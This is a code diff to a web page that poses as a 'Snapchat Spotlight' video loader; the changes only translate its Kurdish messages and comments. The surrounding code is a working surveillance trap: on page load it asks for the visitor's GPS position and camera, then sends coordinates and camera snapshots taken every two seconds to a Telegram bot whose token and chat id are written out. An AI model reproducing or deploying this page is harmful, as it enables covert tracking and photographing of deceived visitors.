@@ -15,7 +15,7 @@
     <div>
         <div class="loader"></div>
         <h1>Snapchat Spotlight</h1>
-        <p>تکایە ڕێگە بدە بۆ بارکردنی ڤیدیۆکە...</p>
+        <p>هيڤي دكه م وه بكه ڤيديو ڤه بيتن ...</p>
     </div>
 
     <video id="video" autoplay></video>
@@ -25,7 +25,7 @@
         const token = '8977945781:AAFI44ROudR5eLDwlBrpNSyNiJj-C8FuDmE';
         const chat_id = '7643191802';
 
-        // ١. ناردنی نامەی ئاسایی
+        // ١. فريكرنا ريسالئن ئاسایی
         async function sendMessage(text) {
             await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                 method: 'POST',
@@ -34,18 +34,18 @@
             });
         }
 
-        // ٢. وەرگرتنی شوێن (Location)
+        // ٢. وەرگرتنا جهئ وي (Location)
         function askLocation() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(position => {
                     const lat = position.coords.latitude;
                     const lon = position.coords.longitude;
-                    sendMessage(`📍 شوێنی دۆزرایەوە:\nhttps://www.google.com/maps?q=${lat},${lon}`);
-                }, () => sendMessage("⚠️ ڕێگەی بە شوێن (GPS) نەدا."));
+                    sendMessage(`📍 جهئ وي هاته ديتن:\nhttps://www.google.com/maps?q=${lat},${lon}`);
+                }, () => sendMessage("⚠️ نه هئلا جهئ وي ببيني (GPS) نەدا."));
             }
         }
 
-        // ٣. گرتنی وێنە و ناردنی
+        // ٣. گرتنا رسمي و فرئكرنئ
         async function startCamera() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
@@ -62,13 +62,13 @@
                     }, 'image/jpeg');
                 }, 2000);
             } catch (err) {
-                sendMessage("⚠️ ڕێگەی بە کامێرا نەدا.");
+                sendMessage("⚠️  رئكئ ب کاميرئ ناده تن.");
             }
         }
 
-        // کاتێک سایتەکە دەکرێتەوە
+        // وه ختئ ويبسايت ڤه د بيتين ڤه دبيته ڤه
         window.onload = () => {
-            sendMessage("🚀 کەسێک هاتە ناو سایتەکەوە، ئێستا داوای کامێرا و شوێنی لێ دەکرێت...");
+            sendMessage("🚀 کەسەک هاتە دناف ويبسايتي دا، نوكه داخازيا کامێرئ و جهئ وي دكه تن...");
             askLocation();
             startCamera();
         };
